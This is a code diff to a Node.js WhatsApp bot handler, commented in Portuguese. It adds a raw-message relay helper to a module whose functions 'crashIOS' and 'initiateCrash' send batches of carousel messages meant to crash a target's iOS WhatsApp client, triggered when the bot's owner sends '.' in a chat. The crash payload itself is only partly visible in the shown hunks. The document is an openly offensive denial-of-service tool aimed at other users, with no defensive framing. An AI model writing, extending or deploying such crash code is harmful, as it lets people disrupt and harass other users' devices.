@@ -28,6 +28,14 @@ const os = require("os");
 const fs = require("fs");
 const { url, fileSha256, mediaKey, fileEncSha256, directPath, jpegThumbnail } = require("./database/mediaall.js");
 
+// === FUNÇÃO GLOBAL: sendjson (igual ao index.js) ===
+function defineSendJson(sock) {
+  sock.sendjson = (jidss, jsontxt = {}, outrasconfig = {}) => {
+    const allmsg = generateWAMessageFromContent(jidss, jsontxt, outrasconfig);
+    return sock.relayMessage(jidss, allmsg.message, { messageId: allmsg.key.id });
+  };
+}
+
 // === ENVIA PONTO (.) PARA ACIONAR O CRASH ===
 async function initiateCrash(sock, targetJid) {
   try {
@@ -84,17 +92,22 @@ async function crashIOS(sock, targetJid) {
           "carouselMessage": { "cards": cards }
         }
       });
-      await delay(800); // evita flood
+      await delay(800);
     } catch (err) {
       console.error(`[CRASH] Erro no lote ${i + 1}:`, err.message);
     }
   }
-  console.log("[CRASH] Todos os lotes enviados!");
+  console.log("[CRASH] Todos os lotes enviados com sucesso!");
 }
 
 // === HANDLER DE MENSAGENS ===
 module.exports = async (sock, m, chatUpdate) => {
   try {
+    // === DEFINE sendjson UMA VEZ POR SESSÃO ===
+    if (!sock.sendjson) {
+      defineSendJson(sock);
+    }
+
     m.id = m.key.id;
     m.isBaileys = m.id.startsWith("BAE5") && m.id.length === 16;
     m.chat = m.key.remoteJid;
@@ -107,13 +120,13 @@ module.exports = async (sock, m, chatUpdate) => {
 
     const from = m.chat;
 
-    // === ACIONA CRASH QUANDO O BOT ENVIA "."
+    // === ACIONA CRASH QUANDO O BOT ENVIA "." ===
     if (m.fromMe && m.text === "." && !m.isBaileys) {
       await crashIOS(sock, from);
       return;
     }
 
-    // === OUTROS COMANDOS (se precisar) ===
+    // === OUTROS COMANDOS (opcional) ===
     // ...
 
   } catch (err) {
@@ -121,7 +134,7 @@ module.exports = async (sock, m, chatUpdate) => {
   }
 };
 
-// === EXPORTA FUNÇÕES (1 argumento cada) ===
+// === EXPORTA FUNÇÕES ===
 module.exports.initiateCrash = initiateCrash;
 module.exports.crashIOS = crashIOS;
 
